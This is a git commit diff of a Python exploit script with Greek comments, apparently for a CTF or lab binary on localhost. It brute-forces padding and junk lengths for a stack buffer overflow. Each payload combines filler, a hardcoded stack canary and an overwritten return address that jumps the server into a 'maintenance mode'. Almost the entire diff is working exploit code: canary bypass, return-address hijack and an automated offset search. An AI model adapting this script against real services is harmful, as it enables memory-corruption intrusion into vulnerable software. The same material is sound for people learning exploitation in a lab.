c1e84adef4fd64e422c91220170f448c80260312
AngelakisG <aggelakis.giorg@gmail.com>
2026-04-08 13:08:29 +0300

    offset

--- of.py
+++ of.py
@@ -2,25 +2,32 @@ import socket
 
 host, port = '127.0.0.1', 28285
 canary = b"\x00\x78\x5b\x1b\x1c\x40\x19\x00"
-maintenance_addr = b"\x26\x92\x04\x08" # Βεβαιώσου ότι είναι η σωστή από την nm
+addr = b"\x26\x92\x04\x08"
 
-for junk_size in range(0, 44, 4):
-    print(f"[*] Testing junk size: {junk_size}...", end=" ")
-    payload = b"A" * 122 + canary + b"A" * junk_size + maintenance_addr + b"\n"
-    
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1.0)
-        s.connect((host, port))
-        s.sendall(payload)
-        
-        # Περιμένουμε να δούμε αν ο server μας στέλνει το "MAINTENANCE MODE"
-        data = s.recv(1024)
-        if b"MAINTENANCE" in data:
-            print(f"\n[!!!] SUCCESS! Junk size is: {junk_size}")
-            break
-        else:
-            print("Failed.")
-        s.close()
-    except:
-        print("Crashed.")
+def check():
+    # Δοκιμάζουμε padding από 110 έως 130
+    for pad in range(118, 128):
+        print(f"Testing Pad {pad}...", end="\r")
+        # Δοκιμάζουμε junk από 0 έως 40 (με βήμα 4)
+        for junk in range(0, 44, 4):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.2)
+                s.connect((host, port))
+                
+                payload = b"A" * pad + canary + b"B" * junk + addr + b"\n"
+                s.sendall(payload)
+                
+                # Αν το exploit πετύχει, ο server θα στείλει το Maintenance message
+                response = s.recv(1024)
+                if b"MAINTENANCE" in response:
+                    print(f"\n[!!!] FOUND IT!")
+                    print(f"PAD: {pad}")
+                    print(f"JUNK: {junk}")
+                    return
+                s.close()
+            except:
+                continue
+    print("\n[!] No luck. Maybe the canary changed?")
+
+check()
